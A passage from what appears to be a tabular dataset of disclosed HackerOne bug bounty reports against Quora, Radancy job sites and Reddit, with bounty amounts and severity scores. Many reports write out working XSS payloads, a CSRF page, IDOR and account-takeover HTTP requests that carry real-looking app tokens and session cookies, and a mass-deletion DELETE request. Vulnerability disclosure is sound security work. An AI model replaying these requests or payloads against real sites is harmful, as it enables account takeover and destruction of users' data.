saved."",""focus_onload"":false,""is_qtext"":true,""require_comment"":false,""require_value"":false,""content_type"":null,""submit_text"":""Update"",""show_editor"":false}&__metadata={}' --compressed 


the attacker send the request


on the victim page will be executed alert(1)


Notice that the cookie, postkey, formkey and other data are of the attacker session.
Enviroment
Tools used: curl and chromium
Suggested fix

correctly escape __e2e_action_id
do not allow to specify a channel name (window_id parameter) that is not ""attached"" to the session of the caller

I can provide a demonstrating video if required or other info.
The severity was calculated with the Hackerone Calculator.",https://hackerone.com/reports/259100,California,United States,Mountain View,2017,8,11,21,9
Quora,501-1000,0.0,10m-50m,$100.00,Low,2.0,Cross-site Scripting (XSS) - Generic,"XSS when clicking ""Share to Twitter"" at quora.com/widgets/embed_iframe?path=...","stefanofinding  submitted a report to Quora.Aug 11th (5 years ago)Summary:
The endpoint at https://{language}.quora.com/widgets/embed_iframe?path={path_to_answer_in_same_language} shows the answer you specify in path (like /Question/answer/User) in a format useful to embed.
There is one button Share that when clicked shows another button Share to Twitter. The href attribute of this last button is of the format javascript: window.open(&quot;https://twitter.com/intent/tweet?text=Answer on @Quora by @User to Question? http://qr.ae/nnnn&quot;, &quot;Share Answer to Twitter&quot;, &quot;width=600, height=250&quot;).
The problem is that you can create a question with "" (quotes) and inject Javascript code that is going to be executed when the user clicks Share to Twitter.
Description (Include Impact):
It requires user interaction, but it works.
Steps To Reproduce

Go to https://www.quora.com/
Click on Ask Question 
Enter a valid question which includes ""-alert(document.domain)-"" somewhere. I entered Question ignore ""-alert(document.domain)-""? and it was accepted as valid
Now you may be in the page of the question you just asked
Click on Answer
Enter anything
Click on Submit
Copy the path from the address bar. Mine was /Question-ignore-alert-document-domain/answer/Cuenta-Para-Probar
Go to https://www.quora.com/widgets/embed_iframe?path={path_from_last_step}. Mine is https://www.quora.com/widgets/embed_iframe?path=/Question-ignore-alert-document-domain/answer/Cuenta-Para-Probar
Click on Share
Click on Share to Twitter
alert(document.domain) is executed

Optional: Your Environment (Browser version, Device, app version, os version etc)

It is not browser dependent. Anyway, I tested it on Firefox, Chrome and Safari for Mac.

Optional: Supporting Material/References (Screenshots)

I don't think is necessary, but let me know if you need something else.",https://hackerone.com/reports/258876,California,United States,Mountain View,2017,8,11,9,0
Radancy,501-1000,0.0,200m-1b,$40.00,Medium,5.45,Information Disclosure,[Cross Domain Referrer Leakage] Password Reset Token Leaking to Third party Sites.,"ykw1337  submitted a report to Radancy.Sep 4th (5 years ago)Domain and URL:
https://werkenbijdefensie.nl
Summary::  Password Reset Token Leaking to Third party Sites from the link in the footer
Description: Hello,
I found that the if a user request for a password reset link and open it but don't change the password and click on the Third Parties Sites link in the Footer his Password Reset Token will be leaked by the Server to that third party site and that token can be used by third parties to reset the password and take over the account.
Steps To Reproduce:

Request a password reset token to your email.
When received open the link.
Click the Link to the social media sites like facebook, twitter, youtube and etc.
The Following Request would be sent:

GET /werkenbijdefensie HTTP/1.1
Host: www.facebook.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:30.0) Gecko/20100101 Firefox/30.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://werkenbijdefensie.nl/het-vizier/wachtwoord-wijzigen.html?token=<some token>
Cookie: <cookies>
Connection: keep-alive
If you need any further information please be free to ask me.",https://hackerone.com/reports/265740,New York,United States,New York,2017,9,4,7,53
Radancy,501-1000,0.0,200m-1b,$50.00,Low,2.0,Denial of Service,[mijn.werkenbijdefensie.nl] Denial of service occurs due to lack of email length confirmation,"what_web  submitted a report to Radancy.Jul 11th (2 years ago)Summary by what_webas per RFC the maximum length allowed for an email address is 255 characters. However, we don't validate email length, so you can add email addresses that exceed 255 characters. Through this, if you sign up for an email with a length of 1 million or more and log in, withdraw, or change your email, the server may cause DOS due to overload.",https://hackerone.com/reports/920926,New York,United States,New York,2020,7,11,4,16
Radancy,501-1000,0.0,200m-1b,$100.00,Medium,5.8,Denial of Service,[www.werkenbijbakertilly.nl] Denial of service due to incorrect server return can result in total denial of service.,"what_web  submitted a report to Radancy.Jun 6th (2 years ago)Summary
When sending too much data through file upload, the server returns an invalid 500 status code instead of the speed 429 status code, causing an internal denial of service.
Description
I uploaded a file from the https://www.werkenbijbakertilly.nl/vacatures/solliciteer/senior-hr-consultant-317 page to test the speed limit, bypass, problem, and hit submit to start testing the speed limit did. As a result, while investigating the problem, we found an interesting bug. First, I found that if I send too many requests to the server, a slow response and an internal denial of service occur with 500 status codes instead of 429 status codes.
I knew that this would result in a real denial of service, and I immediately stopped testing. In addition, we found that when denial of service is activated through the 502 status code, some information is exposed. A report on the release of this information was rewritten by #892610.
Environment

Browser : Chrome Version 83.0.4103.56 (official build) beta (64-bit)
Scope: Web Application
Attack type: Denial of Service
Maximum user privileges needed to reproduce your issue: no privileges
Domain : https://www.werkenbijbakertilly.nl/vacatures/solliciteer/senior-hr-consultant-317
Influence range : https://www.werkenbijbakertilly.nl

Proof of Concept
Image F856944: ___________2020-06-06______5.19.05.png 31.29 KiBZoom in Zoom out Copy Download
Steps To Reproduce :

Go to the https://www.werkenbijbakertilly.nl/vacatures/solliciteer/senior-hr-consultant-317 Page.
Basically I need to upload a cv file when uploading the file. This is a normal cv file. Please upload this file CV___________.docx (F856943)
Submit a form upload a file, and grap the packet.
Now we need to send too many requests to activate the 500 code.
Send a lot of data through Burp Suite -> Intruder function.
Now, when the 500th code is activated, the internal service denial occurs through the 502 status code.

Recommendation
If you send too many requests, the server should not have code 500 activated. Reimplement to enable the 429 status code.
Impact
Internal denial of service leads to total denial of service within the web service https://www.werkenbijbakertilly.nl.2 attachments:F856943: CV___________.docxF856944: ___________2020-06-06______5.19.05.png",https://hackerone.com/reports/892615,New York,United States,New York,2020,6,6,8,59
Radancy,501-1000,0.0,200m-1b,$50.00,Low,2.0,Information Disclosure,[www.werkenbijbakertilly.nl] Information Disclosure,"what_web  submitted a report to Radancy.Jun 6th (2 years ago)Summary by what_webSummary
When the web server encountered a 502 GateWay error, I discovered a strange bug in which internal information was exposed.
Description
When web server 502 gateway is enabled , I found a strange bug indicating the server version and some server path.
This issue is not a major threat to security, but this information usually contains sensitive information.
Environment

Browser : Chrome Version 83.0.4103.56 (official build) beta (64-bit)
Scope: Web Application
Attack type: Information Disclousre
Maximum user privileges needed to reproduce your issue: no privileges

Fix
Developers fixed an issue so that even if a 502 gateway occurred, the 502 server error no longer contains information.",https://hackerone.com/reports/892610,New York,United States,New York,2020,6,6,8,32
Radancy,501-1000,0.0,200m-1b,$100.00,Medium,5.45,Improper Authentication - Generic,[www.werkenbijderet.nl] There is no rate limit for vacature-alert endpoints,what_web  submitted a report to Radancy.May 26th (2 years ago),https://hackerone.com/reports/882942,New York,United States,New York,2020,5,26,16,12
Radancy,501-1000,0.0,200m-1b,$500.00,High,8.5,Privilege Escalation,Ability To Takeover any account by Emaill.,"0xradi  submitted a report to Radancy.Jun 16th (5 years ago)Hi Team,
I've found that your api api.werkenbijdefensie.nl for your mijn defensie Application do not authenticate Facebook users' probably.
Your application doesn't check the Facebook authentication token at all, which makes any attacker able to takeover any account just by using any valid user's email address.
More Details:
Here's the application request to auth facebook users:
Request.png (F194928)
Code 795 BytesWrap lines Copy Download1POST /v1.1/users/sign_up_by_channel HTTP/1.1
2X-app-id: uiq3kjqbpes56os7eqxlky3f
3X-app-token: 4lb93ExKv7ClEQR6iCUaH8h3n7qSCiNc
4Content-Type: application/x-www-form-urlencoded
5Content-Length: 513
6Host: api.werkenbijdefensie.nl
7Connection: Keep-Alive
8Accept-Encoding: gzip
9User-Agent: okhttp/3.2.0
10
11channel=Facebook
12&user[uid]=███
13&user[info][email]=███████
14&user[info][first_name]=Ahmed&user[info][last_name]=██████
15&user[info][name]=Ahmed █████&user[info][birthday]=09/23/1996
16&user[credentials]token]=EAAE8cZCItzkcBAAXYQqnQ5YZB1LqFCzTMrQL4xrYOZAAKkuxkcZAa4sAt3TzwVRMlF4wxV30obzbZCqVG8XDm41yyIWv2wCysHa846rNKXQfRYAtZADHiNZAZA0ZBd6U9GnSJYZCg1RCCgVkOS8ywWjEHeuaKTFvgFe6yeTuPwCAZAhZAIhCatZB0dqO3HOK065qDSRWMxROqzFWndwZDZD
17&user[credentials][expires]=true
18&user[credentials][expires_at]=1502824792036

user[uid]=██████ is user's facebook id.
check this > https://www.facebook.com/████
user[info][email] > is my facebook account's email.
&user[credentials]token] The authentication token.
the reset information aren't important


Here's a response example:
Code 494 BytesWrap lines Copy Download1HTTP/1.1 201 Created
2Server: nginx
3Date: Fri, 16 Jun 2017 20:28:40 GMT
4Content-Type: application/json
5Content-Length: 164
6Connection: keep-alive
7X-Content-Type-Options: nosniff
8X-Frame-Options: sameorigin
9X-XSS-Protection: 1; mode=block
10X-Permitted-Cross-Domain-Policies: master-only
11Strict-Transport-Security: max-age=31536000;
12
13{""id"":""5937d576b5164f04fce31d56"",""token"":""11ef25eb5cdb7e392d502c25ba8f24bfb4e85e55f24208795a49277d0cea2c50"",""account_status"":""confirmed"",""email_status"":""confirmed""}

The token in response is being used to authenticate user while exploring the application as following:  auth_user_request.png (F194927)

POC:
You can preform a request as shown and still get a valid token based on my email or any other valid email on your system.
The request to get token : example1.png (F194936)
The request with token : example11.png (F194937)
Code 369 BytesWrap lines Copy Download1POST /v1.1/users/sign_up_by_channel HTTP/1.1
2X-app-id: uiq3kjqbpes56os7eqxlky3f
3X-app-token: 4lb93ExKv7ClEQR6iCUaH8h3n7qSCiNc
4Content-Type: application/x-www-form-urlencoded
5Content-Length: 70
6Host: api.werkenbijdefensie.nl
7Connection: Keep-Alive
8Accept-Encoding: gzip
9User-Agent: okhttp/3.2.0
10
11channel=Facebook&user[uid]={AnyNumbers}&user[info][email]=victim@email.com
Let me know if you need more information or a video to explain it more.
Best Regards,
@exr4 attachments:F194927: auth_user_request.pngF194928: Request.pngF194936: example1.pngF194937: example11.png",https://hackerone.com/reports/240821,New York,United States,New York,2017,6,16,20,50
Radancy,501-1000,0.0,200m-1b,$20.00,No value,0.0,Information Disclosure,Application error message,"linkks  submitted a report to Radancy.Dec 22nd (7 years ago)Request
GET / HTTP/1.1
Host: 12345'""\'\"");|]%00{%0d%0a<%00>%bf%27'####
Referer: https://serverhk.maximum.com:443/
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Opera/9.80 (Windows NT 6.0; U; en) Presto/2.8.99 Version/11.10
Accept: /*
Response
HTTP/1.1 500 Internal Server Error
Server: nginx/1.8.0
Date: Tue, 22 Dec 2015 00:02:00 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 122538
Connection: keep-alive
Strict-Transport-Security: max-age=31536000
X-Request-Id: f8204df5-0ff8-436e-9967-de2f33d6e5a7
X-Runtime: 0.629495
The impact of this vulnerability
The error messages may disclose sensitive information. This information can be used to launch further attacks.
How to fix this vulnerability
Review the source code for this script.",https://hackerone.com/reports/106384,New York,United States,New York,2015,12,22,0,8
Radancy,501-1000,0.0,200m-1b,$20.00,No value,0.0,Information Disclosure,Application error message,"linkks  submitted a report to Radancy.Jul 3rd (6 years ago)Attack details
HTTP Header input X-Forwarded-For was set to 12345'""\'\"");|]%00{%0d%0a<%00>%bf%27'???#
Error message found:
<b>Warning</b>:  inet_pton() [<a href='function.inet-pton'>function.inet-pton</a>]: Unrecognized address 12345\'\""\\'\\"");|]%00{%0d%0a<%00>%bf%27\'#### in <b>/home/socialrecruitmentmonitor.com/www/wp-content/themes/MaxCommunique/functions.php</b> on line <b>185</b><br />
Request
GET /wp-login.php HTTP/1.1
Referer: http://www.google.com/search?hl=en&q=testing
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36
Client-IP: 127.0.0.1
X-Forwarded-For: 12345'""\'\"");|]%00{%0d%0a<%00>%bf%27'####
X-Forwarded-Host: localhost
Accept-Language: en
Via: 1.1 wa.www.test.com
Origin: http://www.test.com/
Cookie: qtrans_cookie_test=qTranslate+Cookie+Test; PHPSESSID=7b368d6600e0413751e1483eb50288fb; wordpress_test_cookie=WP+Cookie+check
Host: login.socialrecruitmentmonitor.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
Accept: /*
Response
HTTP/1.1 200 OK
Server: Apache
Set-Cookie: qtrans_cookie_test=qTranslate+Cookie+Test; path=/; domain=login.socialrecruitmentmonitor.com
Expires: Wed, 11 Jan 1984 05:00:00 GMT
Cache-Control: no-cache, must-revalidate, max-age=0
Pragma: no-cache
Set-Cookie: wordpress_test_cookie=WP+Cookie+check; path=/
X-Frame-Options: SAMEORIGIN
Vary: Accept-Encoding
Content-Type: text/html; charset=UTF-8
Content-Length: 2722
Accept-Ranges: bytes
Date: Sun, 03 Jul 2016 07:00:19 GMT
X-Varnish: 1812704148
Age: 0
Via: 1.1 varnish
Connection: keep-alive
Original-Content-Encoding: gzip",https://hackerone.com/reports/148963,New York,United States,New York,2016,7,3,7,3
Radancy,501-1000,0.0,200m-1b,$75.00,No value,0.0,Violation of Secure Design Principles,Facebook and twitter page claimed of maximum.com [important],"daiji  submitted a report to Radancy.Sep 21st (6 years ago)Maximum uses these 2 links for their users to follow:
twitter.com/MaximumEMG
facebook.com/MaximumEMG
Mostly maximum.nl redirects to maximum.com , so I thought it is important to tell you about this.Since it is risky for users.
Steps To Reproduce:
Visit maximum.com  [they may be used in many place]
Check facebook and twitter link
They are claimed only for demo purposes.
Please let me know if you have any difficulty in reproducing or if you want to reclaim your page.1 attachment:F121896: maximum.jpg",https://hackerone.com/reports/170894,New York,United States,New York,2016,9,21,3,40
Radancy,501-1000,0.0,200m-1b,$300.00,Medium,5.45,Insecure Direct Object Reference (IDOR),IDOR in editing courses,"kieran  submitted a report to Radancy.May 10th (6 years ago)Description
This vulnerability consists in :
https://mijn.werkenbijdefensie.nl/instellingen/gegevens/
This vulnerability allows an attacker to edit courses that do not belong to him and remove them from the users account.
The edited course ends up in the attackers  account, but gets deleted from the account of the user that made the course.
Proof of concept

Create 2 accounts
go to https://mijn.werkenbijdefensie.nl/instellingen/gegevens/
start intercepting the requests
add a course in one account and look at the reponse of the POST request that is made to add this course. It is a number.
Now go to the other account also make a course.
Edit this course, and capture the POST of the request that is made to edit the course.
Repeat the request but change the ""id"" parameter to the id the course that was made in the other account.
reload the page
The course got removed from the creator's account and was inserted into the account of the attacker.

impact
Attacker can remove all courses of all users by iterating trough all the course id's.",https://hackerone.com/reports/227522,New York,United States,New York,2017,5,10,16,25
Radancy,501-1000,0.0,200m-1b,$30.00,Medium,5.45,Improper Access Control - Generic,I can subscribe and unsubscribe any user with the same token for as many times as i want,"r7xvgpeo6egxr3p1b0dqjk  submitted a report to Radancy.Jun 29th (4 years ago)Summary by r7xvgpeo6egxr3p1b0dqjkHello, This was just a simple Newsletter subscribe and unsubscribe report, which was lack of proper validation, which made it easier to subscribe and unsubscribe a user!",https://hackerone.com/reports/373899,New York,United States,New York,2018,6,29,12,13
Radancy,501-1000,0.0,200m-1b,$20.00,No value,0.0,Information Disclosure,Microsoft IIS tilde directory enumeration,"linkks  submitted a report to Radancy.Jul 2nd (6 years ago)Request
OPTIONS //~1/a.aspx?aspxerrorpath=/ HTTP/1.1
Host: exactrd.maximum.nl
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36
Accept: /
Response
HTTP/1.1 404 Not Found
Content-Type: text/html
Server: Microsoft-IIS/8.0
X-Powered-By: ASP.NET
Date: Sat, 02 Jul 2016 00:35:22 GMT
Content-Length: 1245",https://hackerone.com/reports/148777,New York,United States,New York,2016,7,2,0,36
Radancy,501-1000,0.0,200m-1b,$350.00,No value,0.0,Open Redirect,Open Redirect & Information Disclosure [mijn.werkenbijdefensie.nl],"0xradi  submitted a report to Radancy.Jun 13th (5 years ago)Hi Team,
I've Found an After-Login Open Redirect Vulnerability which can lead to information disclosure like an authentication token and user_id
Steps To Reproduce:

Go to https://mijn.werkenbijdefensie.nl/login?redirect_url=https://google.com
Login using your valid Email & Password
You will be redirected to :

Code 74 BytesWrap lines Copy Download1https://www.google.com/?user=████&token=████&channel=mijnwerkenbijdefensie",https://hackerone.com/reports/239503,New York,United States,New York,2017,6,13,8,14
Radancy,501-1000,0.0,200m-1b,$50.00,Medium,5.45,Open Redirect,Open redirect on https://werkenbijdefensie.nl/,"kuton  submitted a report to Radancy.Jun 22nd (5 years ago)Domain and URL:
https://werkenbijdefensie.nl/ajax/contrast.php?contrast=1
Description:
By adding ""?contrast=1"" after every url, it wil be redirect to the path after https://werkenbijdefensie.nl/
So I can redirect it to another website by adding one more slash
Image F196351: pic.png 28.13 KiBZoom in Zoom out Copy Download
## Browsers Verified In:
Any browser
Steps To Reproduce:
https://werkenbijdefensie.nl//codechoi.com/POC/Maximum/i.php?contrast=1
By visit this link you will be redirected to fake login.1 attachment:F196351: pic.png",https://hackerone.com/reports/242314,New York,United States,New York,2017,6,22,10,57
Radancy,501-1000,0.0,200m-1b,$150.00,Medium,5.45,Cross-Site Request Forgery (CSRF),Possible to unsubscribe from activities using CSRF @ mijn.werkenbijdefensie.nl,"jorik  submitted a report to Radancy.Mar 31st (6 years ago)Domain and URL:
https://mijn.werkenbijdefensie.nl/activiteiten/bezocht
Summary: Possible to unsubscribe from activities/events using CSRF
Description: it is possible to unsubscribe a logged in user from any subscribed events. The unsubscribe is done by a GET-call which is (of course) not protected by an anti-forgery token. The ID of the event is given, which can be found for everyone on the events-overview page. It would be very easy to make an attack page including all events, unsubscribing all users.
Browsers Verified In:

Chrome Version 56.0.2924.87 @ Windows 10

Steps To Reproduce:

User should be logged in to mijn.werkenbijdefensie.nl
User should visit a page with the following HTML (for example, triggering the GET in any way is good enough):

Code 284 BytesWrap lines Copy Download1<html>
2<head>
3<title>CSRF</title>
4</head>
5<body>
6
7You're unsubscribed from activity # 301449 and # 301731
8<img src=""https://mijn.werkenbijdefensie.nl/activiteiten/uitschrijven/301449"" />
9<img src=""https://mijn.werkenbijdefensie.nl/activiteiten/uitschrijven/301731"" />
10
11</body>
12</html>

User is unsubscribed from the specific activities

Known steps to resolve:
Do not use the GET-method for any operation that changes something. Next, add an anti-forgery token as is present everywhere on the site.
Supporting Material/References:

I'm sure you aware, but: https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)",https://hackerone.com/reports/217555,New York,United States,New York,2017,3,31,21,0
Radancy,501-1000,0.0,200m-1b,$300.00,Medium,5.4,Insecure Direct Object Reference (IDOR),Possible to view and takeover other user's education and courses @ mijn.werkenbijdefensie.nl,"jorik  submitted a report to Radancy.Mar 31st (6 years ago)Domain and URL:
https://mijn.werkenbijdefensie.nl/instellingen/gegevens/#tab2
Summary: IDOR vulnerability in editing education/courses 
Description: It is possible to view and change courses and education of other users (also known as an IDOR). It's also possible to save these, and after saving the owner of the course/education is changed to the current user and removed from the other user. 
Browsers Verified In:

Chrome Version 56.0.2924.87 @ Windows 10

Steps To Reproduce:

Log in to mijn.werkenbijdefensie.nl
Go to https://mijn.werkenbijdefensie.nl/instellingen/gegevens/#tab2 (or click the tab ""Opleidingen & Cursussen"" in your personal data)
Add an education or course
Inspect the ""edit""-button of the just created course. Change the data-id to an lower ID that does not belong to you.
Click the edit button from which you changed the id. A popup will open with the data of the course that is not yours.
Change this data and save it. The course will now be yours, and removed from the other users profile.

I've tested it with my own two user accounts, so no data of other users is leaked or changed by me.
Known steps to resolve:
Check if the requested course/education belongs to the user.
Supporting Material/References:

https://www.owasp.org/index.php/Testing_for_Insecure_Direct_Object_References_(OTG-AUTHZ-004)",https://hackerone.com/reports/217558,New York,United States,New York,2017,3,31,21,42
Radancy,501-1000,0.0,200m-1b,$50.00,No value,0.0,Cross-site Scripting (XSS) - Reflected,Cross-site Scripting (XSS) on [maximum.nl] ,"0xradi  submitted a report to Radancy.May 12th (6 years ago)POC:
By visiting the following URL > https://maximum.nl/""><script>prompt(""exr"")</script><!--/index.php
Or preforming the showing request :
Code 834 BytesWrap lines Copy Download1GET /""><script>prompt(""exr"")</script><!--/index.php HTTP/1.1
2Host: maximum.nl
3User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
4Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
5Accept-Language: en-US,en;q=0.5
6Accept-Encoding: gzip, deflate, br
7Cookie: laravel_session=eyJpdiI6Im94Uk52NHpxc3VKcFRoMThqRXZlRGc9PSIsInZhbHVlIjoiUWlqNk10dHNFclRcL1ZNNHJFWlZLWHhTQkNWbmlQd1pEMkFrRkJNSVpKYVlTajlLSlwvUllwWEhCYTNzckMzUVM2OVlkUStcL1BBbnVxMjVtcm51YUowdXc9PSIsIm1hYyI6ImRjMGYxNWFiNzE3MjZjYWMxOTdhY2EyMmVhYjhmYjE2ZTQyMTczYzk4Yjg2ODdlN2I0ZGY3NzgyMzFmM2YxODMifQ%3D%3D; _ga=GA1.2.1741493924.1494610209; _gid=GA1.2.1226624986.1494612538; _vwo_uuid_v2=58B280465974A9FE1B5DAF8815EA2396|02b9c0669e36dd7cd59d4a7a29ab29ef
8Connection: close
9Upgrade-Insecure-Requests: 1
10Cache-Control: max-age=0
11
on Firefox, the JavaScript code injected inside the payload is correclty executed, as showed in the following snippet of response and as it is possible to see in the screenshot attached  maximum-xss.png (F184157).
Code 536 BytesWrap lines Copy Download1
2    
3                  <meta property=""og:image"" content=""https://maximum.nl/""><script>prompt(""exr"")</script><!--/images/logo-maximum.png"" />
4      
5    
6    <title>
7      Employer Branding - Directe werving - Retentie | Maximum
8    </title>
9
10          <link rel=""shortcut icon"" href=""https://maximum.nl/""><script>prompt(""exr"")</script><!--/favicon.ico"">
11    
12    <link media=""all"" type=""text/css"" rel=""stylesheet"" href=""https://maximum.nl/&quot;&gt;&lt;script&gt;prompt(&quot;exr&quot;)&lt;/script&gt;&lt;!--/css/main.css?1490352453"">
Best Regards,
@exr1 attachment:F184157: maximum-xss.png",https://hackerone.com/reports/228006,New York,United States,New York,2017,5,12,19,17
Reddit,501-1000,0.0,No value,"$3,000.00",High,7.95,Improper Authorization,[dubmash] Lack of authorization checks - Update Sound Titles,"sandeep_rj49  submitted a report to Reddit.Feb 12th (2 years ago)Summary:
During the security testing, it has been observed that the UpdateSound api is vulnerable to IDOR. It allows an attacker to edit the victim's sound track titles. This vulnerability can be exploited using the sound track's uuid in the vulnerable request. This id is publicly known. 
Steps To Reproduce:

Replay the vulnerable request using a valid authorization token. 
Change the uuid parameter value with the victim's sound track UUID. 
Victim's sound track title will be changed. 

Vulnerable request:
curl -i -s -k -X $'POST' \
-H $'Host: gateway-production.dubsmash.com' -H $'X-Dmac: ' -H $'X-Remote-Config-Values: []' -H $'X-Time: 1613158267' -H $'User-Agent: Dopesmash/5.20.0 (com.mobilemotion.dubsmash; build:45431; iOS 14.0.1) Alamofire/5.4.0' -H $'X-Accept-Content-Language: en_IN' -H $'X-Device-Timezone: 19800' -H $'X-Device-Language: en' -H $'X-Device-Country: IN' -H $'X-Build-Number: 45431' -H $'Content-Length: 676' -H $'X-App-Version: 5.20.0' -H $'X-Platform: ios' -H $'Connection: close' -H $'Authorization: Bearer XXXXXX' -H $'X-Dubsmash-Device-Id: 0675382B-668E-4EB7-8313-ED96BC132DC9' -H $'Accept-Language: en-IN;q=1.0, hi-IN;q=0.9' -H $'Accept: application/json' -H $'Content-Type: application/json' -H $'X-Dmac-Version: 2' -H $'If-None-Match: W/\""88-IVjhmW06Njcacim4nwHnJNviYsE\""' \
-b $'cfduid=' \
--data-binary $'{\""query\"":\""mutation UpdateSound($input: UpdateSoundInput!) {\n  updateSound(input: $input) {\n    typename\n    sound {\n      typename\n      ...SoundFragment\n    }\n  }\n}\nfragment SoundFragment on Sound {\n  typename\n  uuid\n  created_at\n  sound\n  name\n  waveform_raw_data\n  liked\n  soundStatus: status\n  creator {\n    typename\n    ...ContentCreatorFragment\n  }\n  share_link\n  num_likes\n  num_videos\n}\nfragment ContentCreatorFragment on User {\n  typename\n  username\n  uuid\n  date_joined\n  followed\n  has_invite_badge\n  badges\n  profile_picture\n}\"",\""variables\"":{\""input\"":{\""uuid\"":\""a687eb61ad814a09a8a85cedef7837f3\"",\""name\"":\""test12355556777\""}}}' \
$'https://gateway-production.dubsmash.com/graphql?build_number=45431&platform=ios'
Impact
An attacker can change the title of the victim's sound track to some malicious title like accounthack or similar.",https://hackerone.com/reports/1102365,California,United States,San Francisco,2021,2,12,20,2
Reddit,501-1000,0.0,No value,"$5,000.00",High,7.95,Insecure Direct Object Reference (IDOR),Deleting all DMs on RedditGifts.com,"parasimpaticki  submitted a report to Reddit.May 31st (about 1 year ago)Summary:
It's possible to delete all 4.4M private messages on RedditGifts.com due to missing permission check on DELETE request
Steps To Reproduce:

Set up 3 accounts on RedditGifts.com (FriendA, FriendB, Attacker)
Have FriendA send message to FriendB
As Attacker send the following request (with cookies):

Code 314 BytesWrap lines Copy Download1DELETE /api/v1/messages/4423007/ HTTP/1.1
2Host: www.redditgifts.com
3X-CSRFTOKEN: rYxQcijrs6viZxyLZt2os9gNvLgmEeXfSrH5wOe10GcOg3ABOvL3ebDbAXmeXojj
4Referer: https://www.redditgifts.com/api/
5Cookie: csrftoken=rYxQcijrs6viZxyLZt2os9gNvLgmEeXfSrH5wOe10GcOg3ABOvL3ebDbAXmeXojj; sessionid=osymp6sp6bb83gyt8of7qbeurtuo2450
Change cookies/csrf token and 4423007 to your own message ID
Supporting Material/References:
Video F1320816: recording-1622426911152.webm 4.54 MiBZoom in Zoom out Copy Download
Image F1320817: Screenshot_3.png 65.37 KiBZoom in Zoom out Copy Download
Impact
It's possible to delete all 4.4M private messages on RedditGifts.com2 attachments:F1320816: recording-1622426911152.webmF1320817: Screenshot_3.png0xcain   posted a comment. Jun 1st (about 1 year ago)Hi @parasimpaticki,
Thank you for your submission. I hope you are well. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.
Have a great day! 
Kind regards,
@0xcain0xcain   changed the status to Triaged. Jun 1st (about 1 year ago)Hello @parasimpaticki,
Thank you for your submission! We were able to validate your report, and have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and when/if a fix will be implemented. Please note that the status and severity are subject to change.
Regards,
@0xcaingunther_reddit Reddit staff  posted a comment. Jun 1st (about 1 year ago)Interesting, we're taking a look at this. That endpoint should be doing authorization checks if the request user is in the To or From of the message. Query code for this below:
Code 566 BytesWrap lines Copy Download1    def delete(self, request, message_id):
2        try:
3            message = Message.objects.get(
4                Q(from_user=request.user) | Q(to_user=request.user), id=message_id
5            )
6        except Message.DoesNotExist:
7            respData = build_response_object(error_message=""No message matches query."")
8            return Response(respData, status=status.HTTP_400_BAD_REQUEST)
9
10        message.trash = True
11        message.save()
12        data = {""status"": ""ok""}
13
14        respData = build_response_object(data=data)
15        return Response(respData)
So line 3-4 should have caught this. Similarly the GET request should also have failed. So something is very odd here, thanks for the report. gunther_reddit Reddit staff  updated the severity from critical (9.3) to high. Jun 1st (about 1 year ago)Reddit  rewarded parasimpaticki with a $5,000 bounty. Jun 1st (about 1 year ago)Awarding as a High. Because the message contents couldn't actually be read and only a deletion is possible, it'd require a manual restore for a backup that we confirmed we had. This endpoint is also never hit (because it's not available in the UI, you'd have to explicitly craft this type of request) it'd be detected fairly quickly if someone were to try and destroy all the messages. So this would end up being extremely inconvenient but recoverable and not impactful to the user's integrity of the PMs. gunther_reddit Reddit staff  closed the report and changed the status to Resolved. Jun 1st (about 1 year ago)Devs got on this one real fast. Basically we had a bug in the way we were doing the database query that only presented itself when doing a DELETE action. Doing GET would encounter a failure of the validator which is why no data was returned (it got filtered out). So the team actually nuked that endpoint (because it's not in the UI and we don't need it from a product perspective) and fixed up the query to actually use the right selection (the difference of a Django .filter() vs a .get().). Good find, thanks for the reportparasimpaticki   requested to disclose this report. Jun 1st (about 1 year ago)parasimpaticki   posted a comment. Jun 1st (about 1 year ago)That was fast :D Thanks for the bounty <3gunther_reddit Reddit staff  agreed to disclose this report. Oct 21st (about 1 year ago)  This report has been disclosed. Oct 21st (about 1 year ago)",https://hackerone.com/reports/1213237,California,United States,San Francisco,2021,5,31,2,9
Reddit,501-1000,0.0,No value,$500.00,Medium,5.45,Improper Access Control - Generic,Domain Takeover of Reddit.ru via DNS Hijacking,"indianajson  submitted a report to Reddit.Jun 15th (about 1 year ago)Summary
I discovered that Reddit.ru  was vulnerable to DNS hijacking via DNS provider, Reg.ru. This would allow a malicious attacker to control the content on this domain, as well as, create email addresses associated with it... I'm going to be totally honest and say that any of us ethical hackers would have nerded out giving ourselves @reddit.ru emails. 
Explanation
Reviewing the WHOIS records for Reddit.ru you will see that this is a Reddit-owned domain and that Reg.ru nameservers are listed as the authority for the domain. However, if you had run a DIG request on Reddit.ru you would have gotten a SERVFAIL error. This is because, despite having Reg.ru set as the authoritative nameserver with the domain's registrar, the hosted zone in Reg.ru had been deleted, allowing anyone to create the missing hosted zone and take control of the domain's content, including creating email accounts.
Proof of Concept / Verified Takeover
I created the missing Hosted Zone within Reg.ru as a proof of concept and to keep any malicious actors from hijacking the domain before Reddit could take corrective action. For a visible proof of concept, please check the TXT records for Reddit.ru, which will display:
Code 49 BytesWrap lines Copy Download1reddit.ru.		86400	IN	TXT	""faberge@wearehackerone""
Mitigation
Removing the Reg.ru nameservers for Reddit.ru from your registrar will remove the ability for someone to take control of the domain and will remove my control of the domain. No @reddit.ru email for me... how sad.
Impact
